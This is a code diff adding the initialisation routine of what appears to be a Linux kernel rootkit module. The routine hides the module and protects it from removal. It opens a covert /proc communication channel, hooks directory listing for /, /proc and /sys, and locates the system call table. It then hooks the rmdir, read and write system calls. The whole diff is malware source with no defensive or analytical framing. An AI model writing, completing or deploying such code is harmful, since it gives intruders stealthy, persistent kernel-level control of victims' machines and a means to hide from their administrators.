@@ -904,3 +904,44 @@ int setup_devnull_comm_channel(void)
 
 // ========== END COMM CHANNEL ==========
 
+int init(void)
+{
+    pr_info("Module loaded\n");
+    hide();
+    protect();
+    
+    if (!setup_proc_comm_channel()) {
+        pr_info("Failed to set up comm channel\n");
+        unprotect();
+        unhide();
+        return -1;
+    }
+
+    pr_info("Comm channel is set up\n");
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 4, 0) && \
+    LINUX_VERSION_CODE < KERNEL_VERSION(4, 5, 0)
+
+    asm_hook_create(get_fop("/")->iterate, root_iterate);
+    asm_hook_create(get_fop("/proc")->iterate, proc_iterate);
+    asm_hook_create(get_fop("/sys")->iterate, sys_iterate);
+
+#elif LINUX_VERSION_CODE == KERNEL_VERSION(2, 6, 32)
+
+    asm_hook_create(get_fop("/")->readdir, root_readdir);
+    asm_hook_create(get_fop("/proc")->readdir, proc_readdir);
+    asm_hook_create(get_fop("/sys")->readdir, sys_readdir);
+
+#endif
+    
+    sys_call_table = find_syscall_table();
+    pr_info("Found sys_call_table at %p\n", sys_call_table );
+
+    //setup the example hooks
+    asm_hook_create(sys_call_table[__NR_rmdir], asm_rmdir);
+    hook_create(&sys_call_table[__NR_read], read);
+    hook_create(&sys_call_table[__NR_write], write);
+
+    return 0;
+
+}
